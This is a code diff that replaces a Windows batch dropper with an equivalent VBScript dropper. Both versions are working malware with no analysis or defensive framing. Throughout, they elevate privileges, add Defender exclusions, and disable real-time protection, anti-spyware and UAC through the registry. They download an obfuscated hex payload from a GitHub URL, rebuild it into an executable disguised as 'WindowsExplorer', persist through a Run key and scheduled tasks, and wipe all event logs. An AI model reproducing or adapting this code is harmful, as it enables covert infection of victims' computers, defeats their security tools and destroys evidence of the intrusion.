@@ -1,48 +1,50 @@
-@echo off
-net session >nul 2>&1
-if %errorLevel% neq 0 (
-    powershell -Command "Start-Process '%~f0' -Verb RunAs"
-    exit /b
-)
-Powershell -windowstyle hidden Add-MpPreference -ExclusionPath '%systemdrive%'
-echo -----------Defender-bypass------------------------
-Powershell Add-MpPreference -ExclusionPath 'c:\'
-Powershell Add-MpPreference -ExclusionPath '%tmp%'
-Powershell Add-MpPreference -ExclusionPath '%appdata%'
-Powershell Add-MpPreference -ExclusionPath '%systemdrive%\programdata\Windata'
-Powershell Add-MpPreference -ExclusionProcess 'powershell.exe'
-Powershell Add-MpPreference -ExclusionPath 'C:\ProgramData\GG-Win'
-echo ---------regedit-edite------------------------------------------------
-reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications" /v ToastEnabled /t REG_DWORD /d 0 /f
-reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications" /v LockScreenToastEnabled /t REG_DWORD /d 0 /f
-reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\MSEdge" /v Enabled /t REG_DWORD /d 0 /f
-reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.Defender.SecurityCenter" /v Enabled /t REG_DWORD /d 0 /f
-reg add "HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Explorer" /v DisableNotificationCenter /t REG_DWORD /d 1 /f
-reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
-reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Features" /v "TamperProtection" /t REG_DWORD /d "1" /f
-reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
-reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v TamperProtection /t REG_DWORD /d "1" /f
-reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
-reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
-cls
-echo --------------------create-my-path--------------------------------------------------
-mkdir "%systemdrive%\programdata\GG-Win"
-echo ----------------------------download-hex-file-------------------------------------
-PowerShell.exe -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/ibrahem1012/WindowsExplorer/raw/main/WindowsExplorer.txt','%programdata%\GG-Win\WindowsExplorer.txt')"
-echo ----------------------decode-obfuscated-hex----------------------------------------
-PowerShell.exe -Command "(Get-Content '%programdata%\GG-Win\WindowsExplorer.txt') -replace '\$', '0' -replace '\^', '1' -replace '#', '4' | Out-File '%programdata%\GG-Win\decoded_hex.txt' -Encoding ASCII"
-echo ----------------------convert-hex-to-exe-----------------------------------------
-PowerShell.exe -Command "Get-Content '%programdata%\GG-Win\decoded_hex.txt' | ForEach-Object { $_ -replace '[^0-9A-Fa-f]', '' } | Out-File '%programdata%\GG-Win\clean_hex.txt' -Encoding ASCII"
-PowerShell.exe -Command ^
-"$hex = Get-Content '%programdata%\GG-Win\clean_hex.txt' -Raw; ^
-$bytes = for ($i = 0; $i -lt $hex.Length; $i += 2) { [Convert]::ToByte($hex.Substring($i,2),16) }; ^
-[IO.File]::WriteAllBytes('%programdata%\GG-Win\WindowsExplorer.exe', $bytes)"
-echo -----------start-payload------------------------
-REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "WindowsPowerup" /t REG_SZ /F /D "%programdata%\GG-Win\WindowsExplorer.exe"
-schtasks /create /tn WindowsUpdate /ru "%username%" /sc minute /mo 5 /RL HIGHEST /tr "%ProgramData%\GG-Win\WindowsExplorer.exe" /f
-start %programdata%\GG-Win\WindowsExplorer.exe
-copy %TEMP%\WindowsExplorer.bat %ProgramData%\GG-Win\WindowsExplorer.bat /Y
-schtasks /create /tn WindowsExplorer /ru "%username%" /sc minute /mo 45 /RL HIGHEST /tr "%ProgramData%\GG-Win\WindowsExplorer.bat" /f
-powershell -WindowStyle Hidden -Command "if (-not (Get-Process -Name 'WindowsExplorer' -ErrorAction SilentlyContinue)) {Start-Process '%ProgramData%\GG-Win\WindowsExplorer.exe' -WindowStyle Hidden}"
-echo -----------delete-event-log-------------------------------------------
-for /F "tokens=*" %%1 in ('wevtutil.exe el') DO wevtutil.exe cl "%%1"
+Set shell = CreateObject("WScript.Shell")
+Set fso = CreateObject("Scripting.FileSystemObject")
+If shell.Run("net session", 0, True) <> 0 Then
+    shell.ShellExecute "wscript.exe", Chr(34) & WScript.ScriptFullName & Chr(34), "", "runas", 0
+    WScript.Quit
+End If
+' ------------------ Defender Bypass ------------------
+shell.Run "powershell -windowstyle hidden Add-MpPreference -ExclusionPath '%systemdrive%'", 0, True
+shell.Run "powershell Add-MpPreference -ExclusionPath 'C:\'", 0, True
+shell.Run "powershell Add-MpPreference -ExclusionPath '%tmp%'", 0, True
+shell.Run "powershell Add-MpPreference -ExclusionPath '%appdata%'", 0, True
+shell.Run "powershell Add-MpPreference -ExclusionPath '%systemdrive%\programdata\Windata'", 0, True
+shell.Run "powershell Add-MpPreference -ExclusionProcess 'powershell.exe'", 0, True
+shell.Run "powershell Add-MpPreference -ExclusionPath 'C:\ProgramData\GG-Win'", 0, True
+' ------------------ Regedit Edit ------------------
+shell.Run "reg add ""HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications"" /v ToastEnabled /t REG_DWORD /d 0 /f", 0, True
+shell.Run "reg add ""HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications"" /v LockScreenToastEnabled /t REG_DWORD /d 0 /f", 0, True
+shell.Run "reg add ""HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\MSEdge"" /v Enabled /t REG_DWORD /d 0 /f", 0, True
+shell.Run "reg add ""HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.Defender.SecurityCenter"" /v Enabled /t REG_DWORD /d 0 /f", 0, True
+shell.Run "reg add ""HKCU\SOFTWARE\Policies\Microsoft\Windows\Explorer"" /v DisableNotificationCenter /t REG_DWORD /d 1 /f", 0, True
+shell.Run "reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f", 0, True
+shell.Run "reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Features"" /v TamperProtection /t REG_DWORD /d 1 /f", 0, True
+shell.Run "reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows Defender"" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f", 0, True
+shell.Run "reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows Defender"" /v TamperProtection /t REG_DWORD /d 1 /f", 0, True
+shell.Run "reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows Defender"" /v DisableAntiSpyware /t REG_DWORD /d 1 /f", 0, True
+shell.Run "reg add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"" /v EnableLUA /t REG_DWORD /d 0 /f", 0, True
+' ------------------ Create My Path ------------------
+If Not fso.FolderExists("C:\ProgramData\GG-Win") Then
+    fso.CreateFolder("C:\ProgramData\GG-Win")
+End If
+' ------------------ Download HEX File ------------------
+url = "https://github.com/ibrahem1012/WindowsExplorer/raw/main/WindowsExplorer.txt"
+dest = "C:\ProgramData\GG-Win\WindowsExplorer.txt"
+shell.Run "powershell -Command ""(New-Object System.Net.WebClient).DownloadFile('" & url & "','" & dest & "')""", 0, True
+' ------------------ Decode Obfuscated HEX ------------------
+shell.Run "powershell -Command ""(Get-Content '" & dest & "') -replace '\$', '0' -replace '\^', '1' -replace '#', '4' | Out-File 'C:\ProgramData\GG-Win\decoded_hex.txt' -Encoding ASCII""", 0, True
+' ------------------ Clean HEX ------------------
+shell.Run "powershell -Command ""Get-Content 'C:\ProgramData\GG-Win\decoded_hex.txt' | ForEach-Object { $_ -replace '[^0-9A-Fa-f]', '' } | Out-File 'C:\ProgramData\GG-Win\clean_hex.txt' -Encoding ASCII""", 0, True
+' ------------------ Convert HEX to EXE ------------------
+shell.Run "powershell -Command ""$hex = Get-Content 'C:\ProgramData\GG-Win\clean_hex.txt' -Raw; $bytes = for ($i = 0; $i -lt $hex.Length; $i += 2) { [Convert]::ToByte($hex.Substring($i,2),16) }; [IO.File]::WriteAllBytes('C:\ProgramData\GG-Win\WindowsExplorer.exe', $bytes)""", 0, True
+' ------------------ Start Payload ------------------
+shell.Run "REG ADD ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" /V ""WindowsPowerup"" /t REG_SZ /F /D ""C:\ProgramData\GG-Win\WindowsExplorer.exe""", 0, True
+shell.Run "schtasks /create /tn WindowsUpdate /ru """ & shell.ExpandEnvironmentStrings("%username%") & """ /sc minute /mo 5 /RL HIGHEST /tr ""C:\ProgramData\GG-Win\WindowsExplorer.exe"" /f", 0, True
+shell.Run "start C:\ProgramData\GG-Win\WindowsExplorer.exe", 0, False
+shell.Run "copy %TEMP%\WindowsExplorer.bat C:\ProgramData\GG-Win\WindowsExplorer.bat /Y", 0, True
+shell.Run "schtasks /create /tn WindowsExplorer /ru """ & shell.ExpandEnvironmentStrings("%username%") & """ /sc minute /mo 45 /RL HIGHEST /tr ""C:\ProgramData\GG-Win\WindowsExplorer.bat"" /f", 0, True
+' ------------------ Ensure Process is Running ------------------
+shell.Run "powershell -WindowStyle Hidden -Command ""if (-not (Get-Process -Name 'WindowsExplorer' -ErrorAction SilentlyContinue)) {Start-Process 'C:\ProgramData\GG-Win\WindowsExplorer.exe' -WindowStyle Hidden}""", 0, True
+' ------------------ Clear Event Logs ------------------
+shell.Run "cmd /c for /F ""tokens=*"" %1 in ('wevtutil.exe el') DO wevtutil.exe cl ""%1""", 0, True
